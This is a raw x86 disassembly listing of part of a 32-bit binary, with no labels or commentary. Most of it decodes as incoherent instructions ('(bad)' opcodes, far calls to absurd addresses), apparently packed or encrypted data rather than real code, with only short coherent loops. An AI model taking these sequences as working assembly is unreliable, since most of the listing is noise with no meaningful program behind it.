  40190e:	pop    edi
  40190f:	pop    eax
  401910:	jge    0x4018ad
  401912:	xchg   ebx,eax
  401913:	call   0x35b1fa20
  401918:	mov    eax,0x73235282
  40191d:	cmc    
  40191e:	pop    eax
  40191f:	outs   dx,DWORD PTR ds:[esi]
  401920:	pop    ebp
  401921:	outs   dx,DWORD PTR ds:[esi]
  401922:	jmp    0x81687632
  401927:	xor    al,0x7a
  401929:	fsub   DWORD PTR [edi+0x479aaec]
  40192f:	pop    esp
  401930:	fbld   TBYTE PTR [edx+0x43]
  401933:	mov    dh,0xf3
  401935:	clc    
  401936:	mov    al,ds:0x4fa56a03
  40193b:	call   0x2b8b:0x6c55ef81
  401942:	push   esp
  401943:	jmp    0x51e8:0x52e5e714
  40194a:	call   0x8ea2cc3f
  40194f:	in     al,dx
  401950:	push   esp
  401951:	scas   al,BYTE PTR es:[edi]
  401952:	xchg   ebx,ebx
  401954:	push   ss
  401955:	jmp    0x40199e
  401957:	repnz outs dx,BYTE PTR ds:[esi]
  401959:	sub    DWORD PTR [edi],edx
  40195b:	inc    ebx
  40195c:	ja     0x40192c
  40195e:	push   0x31
  401960:	and    DWORD PTR [edi+0x2790d2d6],0xf2966179
  40196a:	or     dl,BYTE PTR [ebx+0x29b84f29]
  401970:	(bad)  
  401971:	dec    esp
  401972:	call   0xbb605c74
  401977:	push   edx
  401978:	in     eax,dx
  401979:	inc    edx
  40197a:	mov    ds:0x4826a1bc,al
  40197f:	shl    BYTE PTR [ebx],1
  401981:	imul   BYTE PTR [esi+0x4c6afadf]
  401987:	loopne 0x401959
  401989:	in     al,0xcb
  40198b:	inc    esp
  40198c:	sub    bh,BYTE PTR [ebp+eiz*4+0x5d]
  401990:	pop    esp
  401991:	mov    ch,0x48
  401993:	fidiv  DWORD PTR [ebx+0x1d9dac4a]
  401999:	inc    ebp
  40199a:	push   edi
  40199b:	pop    es
  40199c:	sub    BYTE PTR [esi-0x19],0x5f
  4019a0:	jae    0x4019ad
  4019a2:	pop    edx
  4019a3:	ja     0x40198a
  4019a5:	scas   al,BYTE PTR es:[edi]
  4019a6:	popf   
  4019a7:	xor    al,0xbd
  4019a9:	mov    DWORD PTR [edi],edx
  4019ab:	mov    eax,ebx
  4019ad:	or     BYTE PTR [eax+edi*2],ah
  4019b0:	jmp    0x543301a7
  4019b5:	jmp    0xe11b:0xfc16fe95
  4019bc:	mov    dh,0x1
  4019be:	pop    edx
  4019bf:	leave  
  4019c0:	push   0xf8372ad5
  4019c5:	mov    esp,0xf74e1a12
  4019ca:	je     0x401a41
  4019cc:	fist   DWORD PTR [edx+edi*1]
  4019cf:	xchg   esp,eax
  4019d0:	(bad)  
  4019d2:	shr    BYTE PTR [ebx],0x62
  4019d5:	aam    0x18
  4019d7:	jge    0x40196b
  4019d9:	cmp    DWORD PTR [eax-0x4d8807c1],ebp
  4019df:	shl    BYTE PTR [ebx+esi*8+0x25],1
  4019e3:	xchg   esi,eax
  4019e4:	jns    0x4019e2
  4019e6:	mov    bh,0x5c
  4019e8:	aad    0x64
  4019ea:	cmp    BYTE PTR [ecx-0x8],bl
  4019ed:	pushf  
  4019ee:	(bad)  
  4019ef:	arpl   si,si
  4019f1:	cmp    eax,0xe51f0080
  4019f6:	jo     0x401a1b
  4019f8:	fisttp DWORD PTR [edx-0x66]
  4019fb:	xchg   ebp,eax
  4019fc:	aaa    
  4019fd:	xchg   DWORD PTR [ebx],edi
  4019ff:	(bad)  
  401a00:	sub    al,0x2f
  401a02:	sub    eax,0x77b367e
  401a07:	sahf   
  401a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a09:	and    bl,BYTE PTR [ecx+ebx*4+0x18973b21]
  401a10:	dec    esp
  401a11:	dec    ecx
  401a12:	xlat   BYTE PTR ds:[ebx]
  401a13:	lock inc edx
  401a15:	rcr    DWORD PTR [ebx],cl
  401a17:	lods   eax,DWORD PTR ds:[esi]
  401a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a19:	test   ch,0x6e
  401a1c:	cwde   
  401a1d:	mov    ds:0x8b503a0e,al
  401a22:	hlt    
  401a23:	ror    DWORD PTR [esi-0x7579e69],0x2c
  401a2a:	icebp  
  401a2b:	sti    
  401a2c:	xchg   ecx,eax
  401a2d:	xchg   ebx,eax
  401a2e:	outs   dx,BYTE PTR ds:[esi]
  401a2f:	retw   
  401a31:	out    0xf,eax
  401a33:	ins    BYTE PTR es:[edi],dx
  401a34:	push   ds
  401a35:	ret    0x5da3
  401a38:	rol    BYTE PTR [edi],1
  401a3a:	jl     0x401a12
  401a3c:	ficom  DWORD PTR [eax]
  401a3e:	ret    0x4dcb
  401a41:	sbb    edx,ebp
  401a43:	loope  0x401a61
  401a45:	outs   dx,BYTE PTR ds:[esi]
  401a46:	mov    dl,0x1f
  401a48:	scas   eax,DWORD PTR es:[edi]
  401a49:	mov    esi,0x5243d17c
  401a4e:	int    0x5
  401a50:	pop    edx
  401a51:	mov    BYTE PTR [ecx+0x3def8f15],bh
  401a57:	loop   0x401a77
  401a59:	in     eax,dx
  401a5a:	adc    eax,0x80279ce6
  401a5f:	push   ecx
  401a60:	call   0x2581:0x8458bab
  401a67:	dec    edi
  401a68:	inc    esi
  401a69:	inc    ebx
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	add    BYTE PTR [eax],al
  401a6e:	add    BYTE PTR [ebx+0x43464f0d],cl
  401a74:	add    BYTE PTR [ecx-0x77],al
  401a77:	or     eax,0x43464f
  401a7c:	cmp    DWORD PTR ds:0x43464f,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x43464f,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x43464f
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x43464f,ecx
  401aae:	cmp    DWORD PTR ds:0x43464f,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x69b7485e
  401ae8:	and    al,0x1
  401aea:	push   edx
  401aeb:	add    al,0x7e
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401b61
  401af3:	push   0xffffffc3
  401af5:	cmp    bl,bl
  401af7:	ret    
  401af8:	fs jb  0x401a86
  401afb:	fisttp WORD PTR [ebp+0x1c]
  401afe:	jno    0x401aef
  401b00:	xor    BYTE PTR [esi-0x10],dh
  401b03:	sbb    al,0x78
  401b05:	in     eax,0x21
  401b07:	aam    0xe5
  401b09:	pop    ecx
  401b0a:	rcr    BYTE PTR [ebx+0x623e0449],0xe6
  401b11:	mov    ds:0x7be90495,eax
  401b16:	sbb    BYTE PTR [edx+0x5f5841db],0x68
  401b1d:	lock loope 0x401b9d
  401b20:	hlt    
  401b21:	inc    edi
  401b22:	xchg   ebp,eax
  401b23:	or     BYTE PTR [eax-0x63],ch
  401b26:	sbb    bh,BYTE PTR [esi-0x7a]
  401b29:	pop    es
  401b2a:	pop    edx
  401b2b:	sbb    dh,BYTE PTR [edi]
  401b2d:	out    dx,eax
  401b2e:	sub    dh,cl
  401b30:	sahf   
  401b31:	push   0xf0f2b082
  401b36:	(bad)  
  401b38:	aam    0x26
  401b3a:	pop    ecx
  401b3b:	cmp    ebx,DWORD PTR [eax]
  401b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b3e:	imul   edi,DWORD PTR [eax-0x20],0xffffffe4
  401b42:	sub    eax,0x3e2e7b4c
  401b47:	lock arpl WORD PTR [ebp-0x50],di
  401b4b:	or     bh,BYTE PTR [edi-0x51]
  401b4e:	popa   
  401b4f:	mov    dl,BYTE PTR [eax]
  401b51:	jnp    0x401b08
  401b53:	mov    ebx,0x455f7158
  401b58:	cmp    BYTE PTR [ecx-0xe99259a],al
  401b5e:	inc    esi
  401b5f:	fsub   DWORD PTR [edx]
  401b61:	jne    0x401be1
  401b63:	xlat   BYTE PTR ds:[ebx]
  401b64:	rol    dh,0x36
  401b67:	sub    al,0xd2
  401b69:	xchg   edx,eax
  401b6a:	div    DWORD PTR [esi+0x268b5959]
  401b70:	cld    
  401b71:	cmp    DWORD PTR [edi+0x2572fceb],eax
  401b77:	cmp    eax,0x2bf4dd97
  401b7c:	neg    BYTE PTR [ebx+0x64cd649e]
  401b82:	push   edx
  401b83:	mov    dl,0x1c
  401b85:	mov    eax,0x34e556ed
  401b8a:	repnz pop ecx
  401b8c:	pop    es
  401b8d:	ret    0x2d1d
  401b90:	mov    eax,0x63d65ccc
  401b95:	iret   
  401b96:	mov    BYTE PTR [eax+0x1c],al
  401b99:	frstor [edi-0x76]
  401b9c:	(bad)  
  401b9d:	leave  
  401b9e:	lods   eax,DWORD PTR ds:[esi]
  401b9f:	pop    esp
  401ba0:	mov    ss,WORD PTR [esi+0x33c21bf7]
  401ba6:	push   cs
  401ba7:	fidiv  WORD PTR [esi+0xba3a9fd]
  401bad:	test   BYTE PTR [edi-0x6a],ch
  401bb0:	lods   al,BYTE PTR ds:[esi]
  401bb1:	push   ecx
  401bb2:	ret    0x9d69
  401bb5:	sbb    eax,0x94eb6fc4
  401bba:	fwait
  401bbb:	mov    al,ds:0x7a6dc4da
  401bc0:	lahf   
  401bc1:	adc    ch,bh
  401bc3:	dec    ebx
  401bc4:	je     0x401bad
  401bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bc7:	push   ebp
  401bc8:	lods   eax,DWORD PTR ds:[esi]
  401bc9:	push   ss
  401bca:	or     BYTE PTR [ecx-0x3985107b],0xa6
  401bd1:	imul   ebx,DWORD PTR [edi-0x44],0x8dceb007
  401bd8:	xchg   esp,eax
  401bd9:	pushf  
  401bda:	push   0xc34ad777
  401bdf:	push   ebp
  401be0:	jecxz  0x401c16
  401be2:	jb     0x401bfd
  401be4:	inc    ebp
  401be5:	xchg   DWORD PTR ds:0x16ea080c,ebp
  401beb:	mov    ebx,0xf1e8b709
  401bf0:	inc    ecx
  401bf1:	aas    
  401bf2:	sbb    eax,DWORD PTR ds:0x6ca7f047
  401bf8:	mov    bh,BYTE PTR [ebx-0x7ebaae5]
  401bfe:	ror    DWORD PTR [eax-0x67],1
  401c01:	push   ebp
  401c02:	leave  
  401c03:	xchg   DWORD PTR [esi-0x6bc49c77],esp
  401c09:	out    0x1a,al
  401c0b:	add    eax,0x78597ce7
  401c10:	cmp    al,0xb4
  401c12:	adc    ah,BYTE PTR [ebx]
  401c14:	sub    DWORD PTR [edx],ecx
  401c16:	test   ebp,0x3ad8442e
  401c1c:	test   ah,bh
  401c1e:	push   edi
  401c1f:	and    DWORD PTR [ecx+ecx*1],esp
  401c22:	xchg   ecx,eax
  401c23:	(bad)  
  401c24:	fsubr  QWORD PTR [edx]
  401c26:	cdq    
  401c27:	xchg   ebp,eax
  401c28:	ja     0x401c36
  401c2a:	sbb    eax,ebp
  401c2c:	imul   ebp,DWORD PTR [ebx+0x5b8017f0],0xffffffdf
  401c33:	fild   WORD PTR [esi]
  401c35:	pushf  
  401c36:	cmp    ecx,edi
  401c38:	fsubp  st(1),st
  401c3a:	xchg   al,dh
  401c3c:	and    al,al
  401c3e:	scas   al,BYTE PTR es:[edi]
  401c3f:	ja     0x401c2f
  401c41:	xchg   edi,eax
  401c42:	sub    BYTE PTR [ebx+0x48],bh
  401c45:	mov    dl,0xbd
  401c47:	fld    DWORD PTR [edi]
  401c49:	loope  0x401c80
  401c4b:	mov    esp,0xa5347e22
  401c50:	aam    0x41
  401c52:	xchg   ebx,eax
  401c53:	pop    ss
  401c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c55:	cmp    edx,ebp
  401c57:	push   ebx
  401c58:	sbb    BYTE PTR [ecx+0x2e],cl
  401c5b:	cmp    ebx,DWORD PTR [ebp-0x5025573a]
  401c61:	inc    eax
  401c62:	inc    edx
  401c63:	inc    esp
  401c64:	pop    ss
  401c65:	xchg   ebp,eax
  401c66:	cli    
  401c67:	neg    DWORD PTR [edx]
  401c69:	mov    ds:0xb703c34e,eax
  401c6e:	mov    cs,WORD PTR [edi+0x42141bbe]
  401c74:	pushf  
  401c75:	inc    ebp
  401c76:	mov    edx,0x10b1dd05
  401c7b:	dec    eax
  401c7c:	or     bh,BYTE PTR [esi-0x22]
  401c7f:	pop    es
  401c80:	leave  
  401c81:	inc    eax
  401c82:	jp     0x401c1c
  401c84:	and    dl,BYTE PTR [edi+0xd462659]
  401c8a:	and    al,0xe2
  401c8c:	rcr    DWORD PTR [ebp-0x29caee51],cl
  401c92:	push   ss
  401c93:	out    dx,al
  401c94:	adc    al,0x55
  401c96:	push   cs
  401c97:	call   0x5c74543b
  401c9c:	ins    DWORD PTR es:[edi],dx
  401c9d:	imul   eax,DWORD PTR [eax+ebp*1],0xc2b1930d
  401ca4:	jno    0x401cc7
  401ca6:	mov    eax,ds:0xd2a16467
  401cab:	dec    ebx
  401cac:	inc    ecx
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	icebp  
  401ccb:	pop    ss
  401ccc:	adc    BYTE PTR [edx+0x7e7e0689],0xb5
  401cd3:	jg     0x401d53
  401cd5:	jle    0x401d34
  401cd7:	xchg   ebx,eax
  401cd8:	xor    al,0x6c
  401cda:	mov    BYTE PTR ds:0xa88f5149,ch
  401ce0:	shl    DWORD PTR [eax-0x5f],0x49
  401ce4:	mov    ds:0xe8b530d9,eax
  401ce9:	jnp    0x401cb1
  401ceb:	hlt    
  401cec:	and    BYTE PTR [esi],dh
  401cee:	sti    
  401cef:	mov    al,ds:0xbe293b1a
  401cf4:	or     BYTE PTR [eax+ebp*2-0x19ee291],0x9e
  401cfc:	xchg   ecx,eax
  401cfd:	aam    0xf2
  401cff:	out    dx,al
  401d00:	mov    al,BYTE PTR [eax+0x46e924db]
  401d06:	jnp    0x401d81
  401d08:	gs retf 
  401d0a:	dec    ecx
  401d0b:	mov    bl,0xe3
  401d0d:	push   eax
  401d0e:	add    dh,BYTE PTR ds:0xa3cc5b23
  401d14:	mov    bh,0xf9
  401d16:	dec    ecx
  401d17:	jg     0x401d2c
  401d19:	cmp    bl,al
  401d1b:	xor    al,0x1d
  401d1d:	outs   dx,BYTE PTR ds:[esi]
  401d1e:	(bad)  
  401d1f:	fnstcw WORD PTR [esi-0x6759cde9]
  401d25:	stc    
  401d26:	sti    
  401d27:	scas   eax,DWORD PTR es:[edi]
  401d28:	sub    BYTE PTR ds:0xdd43f394,dh
  401d2e:	xchg   ecx,eax
  401d2f:	(bad)  
  401d30:	and    al,0xe2
  401d32:	push   edi
  401d33:	cmp    dl,bh
  401d35:	pop    edx
  401d36:	add    ecx,DWORD PTR [ebp+ebx*2+0x65]
  401d3a:	daa    
  401d3b:	jmp    0x348b3b70
  401d40:	add    eax,0x84a42800
  401d45:	adc    BYTE PTR [ebx+0x72],cl
  401d48:	ds and eax,0x92e97fc8
  401d4e:	int    0x59
  401d50:	cwde   
  401d51:	xchg   edi,eax
  401d52:	push   0x3d
  401d54:	sbb    BYTE PTR [eax],ah
  401d56:	or     bl,BYTE PTR [esi+esi*8]
  401d59:	dec    edx
  401d5a:	sub    al,0x89
  401d5c:	push   esp
  401d5d:	rol    BYTE PTR [eax],0x54
  401d60:	mov    ebx,0x7d2b1ef6
  401d65:	jo     0x401d83
  401d67:	aas    
  401d68:	cmc    
  401d69:	paddd  mm7,mm1
  401d6c:	repz adc eax,0x21875d46
  401d72:	mov    ds,ebx
  401d74:	leave  
  401d75:	mov    ebp,DWORD PTR [ebx]
  401d77:	xchg   esi,eax
  401d78:	mov    bh,0xc
  401d7a:	push   ecx
  401d7b:	sub    DWORD PTR [eax+0x6a],0xffffffc7
  401d7f:	cwde   
  401d80:	loope  0x401dcc
  401d82:	or     DWORD PTR [ebx+0x19d59a80],ebx
  401d88:	cld    
  401d89:	sbb    BYTE PTR [ebx],bh
  401d8b:	inc    eax
  401d8c:	inc    edx
  401d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d8e:	jge    0x401da2
  401d90:	lods   eax,DWORD PTR ds:[esi]
  401d91:	dec    ebx
  401d92:	mov    eax,ds:0x5a889677
  401d97:	fist   DWORD PTR [edi-0x4]
  401d9a:	out    0xd0,eax
  401d9c:	or     cl,BYTE PTR [esi]
  401d9e:	adc    cl,ah
  401da0:	imul   edi,DWORD PTR [edx],0xffffff82
  401da3:	jg     0x401d7b
  401da5:	mov    dl,0x81
  401da7:	nop
  401da8:	mov    dl,0x39
  401daa:	add    al,0xd1
  401dac:	cld    
  401dad:	sbb    DWORD PTR [edx-0x748ff43c],ecx
  401db3:	adc    DWORD PTR [ecx-0x1881debd],ebx
  401db9:	and    BYTE PTR [ebx],dh
  401dbb:	and    al,BYTE PTR [ecx]
  401dbd:	dec    DWORD PTR [esi]
  401dbf:	dec    edi
  401dc0:	fdivr  QWORD PTR [ecx+0x190feba3]
  401dc6:	or     esp,DWORD PTR [edx+0x38]
  401dc9:	das    
  401dca:	paddusb mm4,mm1
  401dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dce:	nop
  401dcf:	and    dh,BYTE PTR [ebx-0x6a19587a]
  401dd5:	lock dec ebp
  401dd7:	fdivr  QWORD PTR [eax]
  401dd9:	je     0x401e33
  401ddb:	out    0x19,eax
  401ddd:	and    eax,0x4956950a
  401de2:	push   edi
  401de3:	gs mov edx,0xfc1c4b8e
  401de9:	in     eax,dx
  401dea:	popf   
  401deb:	xchg   edx,eax
  401dec:	jbe    0x401db6
  401dee:	xor    bl,BYTE PTR [si-0x8]
  401df2:	pop    edx
  401df3:	clc    
  401df4:	xor    DWORD PTR [ebp+0x72aeff5c],0x244ee9a6
  401dfe:	popa   
  401dff:	mov    al,0x2
  401e01:	and    cl,BYTE PTR cs:[ecx+0x1e80601]
  401e08:	outs   dx,DWORD PTR ds:[esi]
  401e09:	fs add al,0x52
  401e0c:	mov    eax,ds:0xf2a53c4b
  401e11:	push   ebx
  401e12:	sbb    eax,0xa4abf1ca
  401e17:	mov    bh,0x29
  401e19:	pusha  
  401e1a:	jns    0x401e85
  401e1c:	sbb    bl,BYTE PTR [esi-0x5eaf0536]
  401e22:	jo     0x401e19
  401e24:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  401e26:	sar    BYTE PTR [ebp-0x52315834],cl
  401e2c:	push   esp
  401e2d:	or     ebp,0xffffffea
  401e30:	fcmovne st,st(0)
  401e32:	retf   
  401e33:	xchg   DWORD PTR gs:[ebx+edi*2+0x72],eax
  401e38:	jo     0x401e21
  401e3a:	jg     0x401dbe
  401e3c:	cli    
  401e3d:	mov    BYTE PTR [ecx+0x2e],al
  401e40:	adc    dh,BYTE PTR [eax+0x629badb9]
  401e46:	loope  0x401e77
  401e48:	inc    ebp
  401e49:	xor    BYTE PTR [edx-0x2],dh
  401e4c:	mov    ebx,DWORD PTR [eax]
  401e4e:	fwait
  401e4f:	ins    BYTE PTR es:[edi],dx
  401e50:	sbb    eax,0x8051f1b1
  401e55:	xchg   esi,eax
  401e56:	push   DWORD PTR [ebp-0x33]
  401e59:	data16 aad 0xbd
  401e5c:	test   DWORD PTR [edi],ebp
  401e5e:	jecxz  0x401e4c
  401e60:	mov    esi,edi
  401e62:	sbb    bl,BYTE PTR [ebp+0x2d7f400b]
  401e68:	and    bl,BYTE PTR [edx]
  401e6a:	mov    bh,0x12
  401e6c:	jb     0x401ee7
  401e6e:	or     ecx,DWORD PTR ds:0x21d808c
  401e74:	fnstenv es:[eax-0x33b68c0]
  401e7b:	pop    esp
  401e7c:	shr    BYTE PTR [esi],0xbe
  401e7f:	xchg   edi,eax
  401e80:	or     dh,BYTE PTR [eax-0x96d96b0]
  401e86:	jl     0x401e28
  401e88:	cld    
  401e89:	xchg   esi,eax
  401e8a:	mov    esp,0x4d89fabb
  401e8f:	call   0x8b4c641f
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	fnstenv [esi-0x74]
  401eb2:	lock rol BYTE PTR [eax],0x7e
  401eb6:	jle    0x401e6d
  401eb8:	jg     0x401f38
  401eba:	jle    0x401e83
  401ebc:	nop
  401ebd:	pop    edi
  401ebe:	jmp    0xaf18:0x5acee65a
  401ec5:	int3   
  401ec6:	sub    edi,esp
  401ec8:	push   0x51
  401eca:	test   eax,0x2729d10b
  401ecf:	cmp    ah,BYTE PTR [ebx-0x291eabcb]
  401ed5:	xchg   esp,eax
  401ed6:	mov    bl,0x8
  401ed8:	pop    esp
  401ed9:	fdivr  QWORD PTR [ebp+0x79cf89e9]
  401edf:	mov    ebx,0xeee73f12
  401ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ee5:	jne    0x401f03
  401ee7:	and    eax,0x3e5fc5fa
  401eec:	push   edx
  401eed:	loopne 0x401f22
  401eef:	cdq    
  401ef0:	popa   
  401ef1:	sub    BYTE PTR [edi+eiz*8+0x9],ah
  401ef5:	fisttp QWORD PTR [eax]
  401ef8:	and    eax,0xe274a47b
  401efd:	arpl   cx,cx
  401eff:	test   eax,0x6936122d
  401f04:	add    ah,dh
  401f06:	push   ebp
  401f07:	mov    es,WORD PTR [eax+eiz*4-0x56c864a7]
  401f0e:	fcom   DWORD PTR [ebx+0x6c]
  401f11:	ins    BYTE PTR es:[edi],dx
  401f12:	jp     0x401f73
  401f14:	mov    ebx,0x734ae116
  401f19:	mov    edi,0xf89ae4fb
  401f1e:	push   es
  401f1f:	test   al,0xe3
  401f21:	fcomp  DWORD PTR [ebx-0xb96ff6c]
  401f27:	push   edi
  401f28:	mov    WORD PTR [eax],gs
  401f2a:	and    ah,BYTE PTR ds:0x8a504c77
  401f30:	into   
  401f31:	adc    ebp,DWORD PTR [esi-0x1a]
  401f34:	ret    0xccb8
  401f37:	outs   dx,BYTE PTR ds:[esi]
  401f38:	(bad)  
  401f39:	sbb    DWORD PTR [ebp+0x14],ebx
  401f3c:	dec    ebx
  401f3d:	add    eax,0x13f4068e
  401f42:	int3   
  401f43:	(bad)  
  401f44:	jne    0x401f22
  401f46:	enter  0xfa3d,0xd7
  401f4a:	jmp    0x35f6ca8f
  401f4f:	inc    edi
  401f50:	sbb    ah,cl
  401f52:	mov    edx,0xafdf024a
  401f57:	cdq    
  401f58:	sub    eax,DWORD PTR [ebx+0x22]
  401f5b:	inc    eax
  401f5c:	rcl    BYTE PTR [ebx+0x1b],cl
  401f5f:	mov    dh,0xd3
  401f61:	pop    esp
  401f62:	fst    DWORD PTR [esi-0x26c6128a]
  401f69:	(bad)  
  401f6a:	popa   
  401f6b:	lahf   
  401f6c:	lahf   
  401f6d:	adc    DWORD PTR [edi+0x4a3eb5c0],esi
  401f73:	dec    esi
  401f74:	adc    cl,BYTE PTR [edx+0x30]
  401f77:	neg    BYTE PTR [edx]
  401f79:	add    eax,0xf36b2b72
  401f7e:	(bad)  
  401f80:	call   0x709b:0xa8a2b925
  401f87:	cmp    edi,DWORD PTR [ecx+0x6d1dda71]
  401f8d:	loop   0x401faf
  401f8f:	xchg   ecx,eax
  401f90:	neg    BYTE PTR [ecx+0x2e]
  401f93:	mov    esp,0xb3dbb943
  401f98:	sbb    edi,DWORD PTR [edx]
  401f9a:	xor    al,0xd1
  401f9c:	ins    BYTE PTR es:[edi],dx
  401f9d:	pop    ebp
  401f9e:	or     eax,0xfb63c3df
  401fa3:	addr16 leave 
  401fa5:	loop   0x401fdd
  401fa7:	std    
  401fa8:	shl    esp,cl
  401faa:	mov    edx,0x5c7677c5
  401faf:	call   0x6775:0xb89c8c62
  401fb6:	pop    ds
  401fb7:	sbb    bh,al
  401fb9:	(bad)  
  401fba:	sub    esi,ebx
  401fbc:	xchg   ebp,eax
  401fbd:	inc    ebx
  401fbe:	xor    al,0xe0
  401fc0:	push   edx
  401fc1:	sub    eax,0xf49a5052
  401fc6:	and    dh,BYTE PTR [edi+0x5d06dbb5]
  401fcc:	inc    ebx
  401fcd:	ret    
  401fce:	aas    
  401fcf:	(bad)  
  401fd0:	jns    0x401fa3
  401fd2:	popf   
  401fd3:	sub    al,0x54
  401fd5:	xchg   esi,eax
  401fd6:	xchg   ebx,eax
  401fd7:	outs   dx,BYTE PTR ds:[esi]
  401fd8:	ja     0x402032
  401fda:	adc    ebp,edi
  401fdc:	pop    ecx
  401fdd:	push   0xbd383a7
  401fe2:	bound  ecx,QWORD PTR [edx+0x68]
  401fe5:	(bad)  
  401fe6:	dec    eax
  401fe7:	cli    
  401fe8:	lahf   
  401fe9:	hlt    
  401fea:	push   0xfffffff6
  401fec:	iret   
  401fed:	mov    WORD PTR [edi-0x74257997],?
  401ff3:	adc    BYTE PTR [edx+0x31],bh
  401ff6:	jo     0x401fa0
  401ff8:	xchg   ebx,eax
  401ff9:	std    
  401ffa:	lahf   
  401ffb:	or     dh,BYTE PTR [eax+0x4]
  401ffe:	jecxz  0x40205d
  402000:	mov    ebx,0xceee0348
  402005:	inc    ecx
  402006:	add    al,0xb7
  402008:	push   eax
  402009:	aaa    
  40200a:	inc    esp
  40200b:	jmp    0xbb1a1db6
  402010:	inc    edx
  402011:	xchg   ebp,eax
  402012:	adc    ebx,DWORD PTR [edi+eiz*2+0x59aef5a3]
  402019:	dec    ecx
  40201a:	sbb    BYTE PTR [edi-0x70],dh
  40201d:	pop    edi
  40201e:	ror    DWORD PTR [edi+0x2366b879],1
  402024:	xchg   ebx,eax
  402025:	lods   al,BYTE PTR ds:[esi]
  402026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402027:	mov    esp,0xb1cc4cac
  40202c:	adc    BYTE PTR [ebp-0x44de0ad],cl
  402032:	adc    bl,bh
  402034:	mov    esi,0x6b4e0810
  402039:	dec    edx
  40203a:	loope  0x4020ad
  40203c:	sub    DWORD PTR [ebx+0x2b511d3f],ebp
  402042:	sub    al,0x55
  402044:	in     al,0xf6
  402046:	daa    
  402047:	data16 fidiv WORD PTR [ebp-0x4ee0e086]
  40204e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40204f:	(bad)  
  402050:	daa    
  402051:	aam    0x53
  402053:	mov    BYTE PTR [edx],dl
  402055:	dec    eax
  402056:	mov    ebx,0x85287422
  40205b:	mov    ebp,0x81af1b4f
  402060:	mov    esp,0x7e6c4b38
  402065:	(bad)  
  402066:	inc    esp
  402067:	xchg   esp,eax
  402068:	jmp    0x3609fe69
  40206d:	test   eax,0x8873a053
  402072:	mov    ax,WORD PTR [ebp-0x4]
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    eax,esi
  4020a2:	push   0x4e
  4020a4:	or     DWORD PTR [edi+0x2],edi
  4020a7:	jle    0x402127
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	sub    al,0xaf
  4020af:	and    BYTE PTR [ebp+eiz*8-0x4b],dl
  4020b3:	lea    ecx,[eax]
  4020b5:	(bad)  
  4020b6:	adc    DWORD PTR ds:0xb6a93c27,edi
  4020bc:	sub    DWORD PTR [edx-0x72],esp
  4020bf:	fisubr DWORD PTR [ebx-0x6046ca67]
  4020c5:	mov    al,ds:0x37d2feb2
  4020ca:	in     al,0xf5
  4020cc:	loope  0x402091
  4020ce:	mov    ecx,0xe314fcfa
  4020d3:	in     al,0xc5
  4020d5:	call   0x7c463967
  4020da:	loope  0x402109
  4020dc:	int    0x6d
  4020de:	imul   ebx,DWORD PTR [ebx+ebp*8],0xe466138c
  4020e5:	dec    eax
  4020e6:	adc    ebp,DWORD PTR [esi-0xb]
  4020e9:	test   al,0xf4
  4020eb:	inc    edx
  4020ec:	sbb    BYTE PTR [edi-0x555915c0],0x83
  4020f3:	push   es
  4020f4:	loope  0x4020b1
  4020f6:	adc    esi,edi
  4020f8:	enter  0xa4d3,0xc9
  4020fc:	sub    DWORD PTR es:[edi+0x6048b7a4],ecx
